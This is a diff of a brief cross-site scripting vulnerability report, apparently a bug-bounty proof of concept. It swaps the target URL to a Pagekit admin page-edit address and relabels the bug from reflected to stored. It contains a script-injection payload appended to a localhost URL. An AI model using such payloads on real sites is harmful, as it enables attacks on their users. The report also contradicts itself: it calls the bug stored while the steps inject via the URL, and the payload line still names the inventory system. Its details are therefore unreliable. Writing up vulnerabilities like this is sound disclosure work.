@@ -6,8 +6,7 @@ Stored XSS, also known as Type-1 or Persistent XSS attacks, typically rely on un
 
 # POC
 ## Steps To Reproduce:
-Go to : http://localhost/php-inventory-management-system/index.php
-![Uploading image.png…]()
+Go to : http://localhost/pagekit/admin/site/page/edit?id=2
 
 
 On the url, enter payload after url: cuzh4"><script>alert('XSS')</script>rvhmf
@@ -17,4 +16,4 @@ Payload: http://localhost/php-inventory-management-system/index.php/cuzh4"><scri
 
 
 # Impact:
-The impact of reflected cross-site scripting (XSS) can be significant and pose various risks to both web applications and users
+The impact of store cross-site scripting (XSS) can be significant and pose various risks to both web applications and users
